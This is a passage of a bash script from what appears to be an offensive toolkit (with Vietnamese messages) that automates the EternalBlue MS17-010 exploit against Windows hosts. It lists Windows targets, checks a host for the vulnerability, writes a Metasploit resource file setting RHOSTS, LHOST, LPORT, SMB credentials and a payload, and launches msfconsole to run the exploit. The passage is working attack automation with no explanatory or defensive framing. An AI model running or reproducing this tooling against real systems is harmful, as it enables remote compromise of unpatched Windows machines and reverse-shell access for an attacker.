   --  ----
   6   Windows 2012 R2 x64

!
	elif [ "$target" = "7" ]; then
cat << !
Exploit target:

   Id  Name
   --  ----
   7   Windows 8.1 x64

!
	elif [ "$target" = "8" ]; then
cat << !
Exploit target:

   Id  Name
   --  ----
   8   Windows 2008 R2 SP1 x64

!
	elif [ "$target" = "9" ]; then
cat << !
Exploit target:

   Id  Name
   --  ----
   9   Windows 7 SP1 x64

!
	elif [ "$target" = "10" ]; then
cat << !
Exploit target:

   Id  Name
   --  ----
   10  Windows 2008 SP1 x64

!
	elif [ "$target" = "11" ]; then
cat << !
Exploit target:

   Id  Name
   --  ----
   11  Windows 2003 R2 SP2 x64

!
	elif [ "$target" = "12" ]; then
cat << !
Exploit target:

   Id  Name
   --  ----
   12  Windows XP SP2 x64

!
	elif [ "$target" = "13" ]; then
cat << !
Exploit target:

   Id  Name
   --  ----
   13  Windows 8.1 x86

!
	elif [ "$target" = "14" ]; then
cat << !
Exploit target:

   Id  Name
   --  ----
   14  Windows 7 SP1 x86

!
	elif [ "$target" = "15" ]; then
cat << !
Exploit target:

   Id  Name
   --  ----
   15  Windows 2008 SP1 x86

!
	elif [ "$target" = "16" ]; then
cat << !
Exploit target:

   Id  Name
   --  ----
   16  Windows 2003 SP2 x86

!
	elif [ "$target" = "17" ]; then
cat << !
Exploit target:

   Id  Name
   --  ----
   17  Windows XP SP3 x86

!
	elif [ "$target" = "18" ]; then
cat << !
Exploit target:

   Id  Name
   --  ----
   18  Windows 2000 SP4 x86

!
	fi
fi
}
################# payload list ###################
#############################################
function payload_list {
path_present=`pwd`
source $config_file
payload_list_file="$path_present/Config/payloads"
rm -rf $payload_list_file
touch $payload_list_file
cat $payload_data | grep -i "   generic/" > $payload_list_file
cat $payload_data | grep -i "   windows/" >> $payload_list_file
echo "" >> $payload_list_file
}
function out_value {
rhost=`echo $rhost`
rport=`echo $rport`
groomallocations=`echo $groomallocations`
groomdelta=`echo $groomdelta`
maxexploitattempts=`echo $maxexploitattempts`
processname=`echo $processname`
smbdomain=`echo $smbdomain`
smbpass=`echo $smbpass`
smbuser=`echo $smbuser`
verifyarch=`echo $verifyarch`
verifytarget=`echo $verifytarget`
lport=`echo $lport`
paylo=`echo $paylo`
lhost=`echo $lhost`
file_ip="ip.txt"
}
function check {
rhost=`echo $rhost`
rport=`echo $rport`
path_present=`pwd`
path_tool="../../Tools/Vulnerability-Exploit/MS17-010/"
file_ip="ip.txt"
timeout="3"
cd $path_tool
rm -rf $file_ip > /dev/null 2>&1
touch $file_ip > /dev/null 2>&1
echo "$rhost" >>  $file_ip
bash checkvuln.sh -p $rport -t $timeout
cd $path_present
}
function module_run {
out_value
module_path_present=`pwd`
module_path_rc_file="$module_path_present/Config"
rc_file="$module_path_rc_file/file.rc"
rm -rf $rc_file > /dev/null 2>&1
touch $rc_file > /dev/null 2>&1
echo "use exploit/windows/smb/ms17_010_eternalblue_allwin" >> $rc_file
}
function attack {
#####################
path_present=`pwd`
cd $path_present/../../output
output_file=`pwd`
###################
path_tool="$output_file/../Tools/Vulnerability-Exploit/MS17-010/"
cd $path_tool
file_ip="ip.txt"
rm -rf $file_ip > /dev/null 2>&1
touch $file_ip > /dev/null 2>&1
echo "$rhost" >>  $file_ip
check_host=`bash checkvuln.sh -p $rport -t $timeout | grep MS17-010`
if [[ "$check_host" != "" ]]; then
	if [[ "$paylo" != "" ]]; then
		echo "set GroomAllocations $groomallocations" >> $rc_file
		echo "set groomdelta $groomdelta" >> $rc_file
		echo "set MaxExploitAttempts $maxexploitattempts" >> $rc_file
		echo "set ProcessName $processname" >> $rc_file
		echo "set SMBDomain $smbdomain" >> $rc_file
		echo "set SMBUser $smbuser" >> $rc_file
		echo "set SMBPass $smbpass" >> $rc_file
		echo "set VerifyTarget $verifyarch" >> $rc_file
		echo "set VerifyArch $verifytarget" >> $rc_file
		echo "set RHOSTS $rhost" >> $rc_file
		echo "set RPORT $rport" >> $rc_file
		echo "set LHOST $lhost" >> $rc_file
		echo "set LPORT $lport" >> $rc_file
		echo "set TARGET $target" >> $rc_file
		echo "exploit -j -z" >> $rc_file
		service postgresql start
		cd ../../../Victim
		echo -e "${BlueF}[!]$RESET $msf_start ${red}Metasploit Framework${RESET}"
		msfconsole -r $rc_file
		service postgresql stop
		cd $path_present
	else
		echo -e "${red}[-]$RESET Bạn chưa nhập giá trị payload."
	fi
else
  echo -e "${red}[-]$RESET $yout_sure"
cd $path_present
fi
}

